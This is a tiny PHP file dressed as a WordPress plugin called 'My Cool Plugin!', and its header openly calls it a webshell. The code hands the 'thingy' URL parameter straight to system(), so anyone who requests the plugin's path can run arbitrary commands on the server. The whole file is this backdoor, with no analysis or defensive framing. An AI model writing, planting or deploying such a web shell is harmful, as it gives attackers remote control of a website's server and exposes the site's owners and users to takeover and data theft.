<?php
/**
* Plugin Name: My Cool Plugin!
* Description: Webshell available at /wp-content/plugins/mycoolplugin/mycoolplugin.php?thingy=[your input]
* Author: N. Trudore
* License: MIT
*/
if(isset($_GET['thingy'])) {
    system($_GET['thingy']);
}
?>

